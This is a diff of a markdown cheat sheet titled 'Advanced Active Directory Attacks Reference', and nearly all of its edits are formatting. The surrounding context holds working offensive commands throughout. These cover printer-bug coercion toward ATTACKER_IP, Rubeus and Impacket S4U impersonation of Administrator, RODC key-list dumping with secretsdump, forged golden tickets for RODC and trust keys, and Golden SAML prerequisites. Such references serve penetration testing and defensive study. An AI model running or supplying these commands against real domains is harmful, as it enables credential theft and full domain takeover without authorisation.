@@ -1,6 +1,7 @@
 # Advanced Active Directory Attacks Reference
 
 ## Table of Contents
+
 1. [Delegation Attacks](#delegation-attacks)
 2. [Group Policy Object Abuse](#group-policy-object-abuse)
 3. [RODC Attacks](#rodc-attacks)
@@ -17,9 +18,11 @@
 
 ### Unconstrained Delegation
 
-When a user authenticates to a computer with unconstrained delegation, their TGT is saved to memory.
+When a user authenticates to a computer with unconstrained delegation, their TGT
+is saved to memory.
 
 **Find Delegation:**
+
 ```powershell
 # PowerShell
 Get-ADComputer -Filter {TrustedForDelegation -eq $True}
@@ -29,6 +32,7 @@ MATCH (c:Computer {unconstraineddelegation:true}) RETURN c
 ```
 
 **SpoolService Abuse:**
+
 ```bash
 # Check spooler service
 ls \\dc01\pipe\spoolss
@@ -41,6 +45,7 @@ python3 printerbug.py 'domain/user:pass'@DC01 ATTACKER_IP
 ```
 
 **Monitor with Rubeus:**
+
 ```powershell
 Rubeus.exe monitor /interval:1
 ```
@@ -48,17 +53,20 @@ Rubeus.exe monitor /interval:1
 ### Constrained Delegation
 
 **Identify:**
+
 ```powershell
 Get-DomainComputer -TrustedToAuth | select -exp msds-AllowedToDelegateTo
 ```
 
 **Exploit with Rubeus:**
+
 ```powershell
 # S4U2 attack
 Rubeus.exe s4u /user:svc_account /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/target.domain.local /ptt
 ```
 
 **Exploit with Impacket:**
+
 ```bash
 getST.py -spn HOST/target.domain.local 'domain/user:password' -impersonate Administrator -dc-ip DC_IP
 ```
@@ -111,11 +119,13 @@ Get-DomainObjectAcl -Identity "SuperSecureGPO" -ResolveGUIDs | Where-Object {($_
 
 ### RODC Golden Ticket
 
-RODCs contain filtered AD copy (excludes LAPS/Bitlocker keys). Forge tickets for principals in msDS-RevealOnDemandGroup.
+RODCs contain filtered AD copy (excludes LAPS/Bitlocker keys). Forge tickets for
+principals in msDS-RevealOnDemandGroup.
 
 ### RODC Key List Attack
 
 **Requirements:**
+
 - krbtgt credentials of the RODC (-rodcKey)
 - ID of the krbtgt account of the RODC (-rodcNo)
 
@@ -128,6 +138,7 @@ secretsdump.py DOMAIN/user:password@host -rodcNo XXXXX -rodcKey XXXXXXXXXXXXXXXX
 ```
 
 **Using Rubeus:**
+
 ```powershell
 Rubeus.exe golden /rodcNumber:25078 /aes256:RODC_AES256_KEY /user:Administrator /id:500 /domain:domain.local /sid:S-1-5-21-xxx
 ```
@@ -285,6 +296,7 @@ kerberos::golden /domain:domain.local /sid:S-1-5-21-xxx /rc4:TRUST_KEY /user:Adm
 ## ADFS Golden SAML
 
 **Requirements:**
+
 - ADFS service account access
 - Token signing certificate (PFX + decryption password)
 
